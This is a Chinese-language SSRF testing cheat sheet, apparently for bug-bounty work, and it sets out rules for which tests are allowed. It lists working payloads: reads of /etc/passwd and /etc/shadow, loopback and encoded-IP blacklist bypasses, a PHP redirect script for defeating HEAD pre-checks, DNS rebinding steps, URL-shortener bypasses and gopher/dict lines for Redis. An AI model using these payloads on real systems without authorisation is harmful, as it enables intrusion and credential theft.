# 绕过速查(2026-08 实战补充): 目标域名/IP 被黑名单拦截时——第三方短链服务转换元数据/内网 URL
# (短链域名不在黑名单, 服务端请求短链→302→目标), 同族: 重定向跳转/十进制 IP/DNS rebinding

# §6 SSRF
### SRC 合规边界（执行前必读）
```
[SRC ALLOWED] DNS/collaborator OOB回调确认SSRF存在、file://读/etc/passwd(自己账号)、
              cloud metadata(scope内时)、HTTP内网探测(SRC提供靶场时)
[SRC FORBIDDEN] 写webshell/cron/SSH key、内网扫描(无靶场时)、Redis命令执行、
                FastCGI RCE、MySQL协议攻击
```

### 识别信号
- `url callback redirect webhook image_url target`

### 场景判断树（先判定场景，再选手法）
```
发现参数疑似SSRF?
├── 目标有OOB能力? (能访问外网)
│   └── 替换参数为collaborator URL → 有DNS回调=SSRF存在 ✅
│
├── 目标不出网? (完全无法OOB)
│   ├── 尝试 file:///etc/passwd 读本地文件 → 有内容=SSRF存在 ✅
│   └── 尝试 http://127.0.0.1:80 → 返回页面内容=SSRF存在 ✅
│
├── 有白名单/协议限制? → 见下方"绕过方式"
│
└── 被WAF拦截? → 先换协议(http↔https)再换编码 → 还不行→LAST RESORT bypass
```

### 决策流程
```
Step 0 — OOB检测(首选，最快确认SSRF存在):
  替换参数为: http://{collaborator-url}/ssrf
  → collaborator收到HTTP/DNS请求 → SSRF存在 ✅
  [SRC] OOB回调=SSRF确认证据，不需要进一步利用

Step 1 — 确认后可选的危害证明(只读不写):
  file:///etc/passwd          → 读系统文件(证明能访问内网文件)
  file:///c:/windows/win.ini  → Windows系统文件
  http://127.0.0.1:80         → 本地Web服务(看有没有敏感信息)
  http://[::1]:80             → IPv6本地回环
  [SRC] 以上均只读，不写文件、不写shell、不改配置

Step 2 — 白名单绕过方式(纯检测思路，不用于利用):
  
  a) DNS Rebinding 绕过(TOCTOU利用):
     原理: 域名配置极短TTL(0s)→第一次解析返回正常IP(过白名单检查)
          →第二次解析(实际请求)返回内网IP(127.0.0.1)
     检测: 准备一个TTL=0的域名 → 先HEAD请求过白名单 → GET时域名解析到内网
     [SRC] 只通过OOB回调验证绕过了白名单，不实际内网探测

  b) 302 Redirect 绕过(HTTP协议层):
     原理: 攻击者VPS上部署脚本→HEAD请求返回200(过预检)→GET请求返回302跳转到内网
     →后端HTTP库默认跟随重定向→未对跳转后URL二次校验→SSRF绕过
     PHP实现(检测用，部署在自己VPS):
       if ($_SERVER['REQUEST_METHOD'] === 'HEAD') { header("HTTP/1.1 200 OK"); echo "ok"; }
       else { header("HTTP/1.1 302 Found"); header("Location: http://127.0.0.1:80"); }
     [SRC] 只证明可绕过白名单/HEAD预检→OOB回调确认，不实际内网利用

  c) HEAD+GET 预检绕过(厂商常见防御):
     场景: 服务器先HEAD请求验货(看Content-Type/Content-Length)→再GET请求
     绕过: 
       - DNS Rebinding(见a) → HEAD时外网IP，GET时内网IP
       - 302 Redirect(见b) → HEAD返回200，GET重定向内网
     [SRC] 证明防御可绕过即可，不实际内网探测

  d) 进制编码/IP简写:
     http://2130706433/             → 127.0.0.1 十进制
     http://0x7f000001/             → 127.0.0.1 十六进制
     http://0x7f.0x0.0x0.0x1/      → 分段十六进制
     http://[::ffff:127.0.0.1]/    → IPv6映射
     http://0/                      → Linux下代表0.0.0.0=本机
     http://127.1/                  → 省略写法
     http://localhost/              → DNS解析
     http://evil.com@127.0.0.1/    → @绕过(部分库忽略@前内容)
     http://127.0.0.1#evil.com/    → #绕过(#后内容被忽略)

Step 3 — 协议选择分层策略:
  探测阶段: http:// (最快确认存活)
  读取阶段: file:// (读文件确认危害)
  验证阶段: collaborator OOB (最通用)
  [SRC] 不需要用到 gopher/dict 协议来证明SSRF存在
  [SRC] gopher/dict 协议涉及内网协议交互 → 除非SRC明确授权，否则禁用
```

### 场景优先级速记
```
OOB回调 → 最快确认SSRF存在  ← 首选
读文件   → file:// 读passwd证明能访问内网  ← 次选
DNS Rebinding / 302 Redirect → 绕过白名单/HEAD预检  ← 绕过场景
进制编码/IP简写 → 绕过IP黑名单  ← 绕过场景
```

### Payload
```
[SRC SAFE] 仅用于确认SSRF存在:
  http://{collaborator-url}/ssrf       → OOB确认
  file:///etc/passwd                    → 读文件确认
  http://127.0.0.1:80                   → 本地确认
  http://[::1]:80                       → IPv6本地
  
[SRC FORBIDDEN — 仅授权渗透测试使用]:
  gopher://127.0.0.1:6379/_*         → Redis交互(写shell/cron/SSH key)
  dict://127.0.0.1:6379/INFO          → 内网端口探测
  file:///etc/shadow                  → 敏感文件读取
  cloud metadata(无scope)             → 云元数据
```
